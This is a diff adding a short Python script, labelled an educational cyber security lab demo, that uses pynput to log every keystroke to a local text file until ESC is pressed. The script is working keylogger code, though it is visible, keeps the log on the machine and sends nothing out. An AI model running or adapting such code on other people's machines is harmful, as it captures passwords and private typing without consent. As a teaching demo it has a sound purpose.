@@ -1,0 +1,37 @@
+# Safe Keylogger Demo Script
+# Educational Purpose Only – Cyber Security Lab
+
+from pynput import keyboard
+
+log_file = "C:/Users/Admin/Documents/keylog_demo.txt"
+
+print("=== Keylogger Demo Started ===")
+print("NOTE: This is a visible and controlled educational demo.")
+print("Press ESC to stop.\n")
+
+# Function to write logs
+def write_to_file(key):
+    try:
+        k = key.char  # Single character keys
+    except AttributeError:
+        k = str(key)  # Special keys (e.g., Key.space)
+
+    with open(log_file, "a") as f:
+        if k == "Key.space":
+            f.write(" ")
+        elif k == "Key.enter":
+            f.write("\n")
+        elif k == "Key.backspace":
+            f.write("[BACKSPACE]")
+        else:
+            f.write(k)
+
+# Function to stop listener
+def on_release(key):
+    if key == keyboard.Key.esc:
+        print("\n=== Keylogger Stopped ===")
+        return False
+
+# Start listening
+with keyboard.Listener(on_press=write_to_file, on_release=on_release) as listener:
+    listener.join()
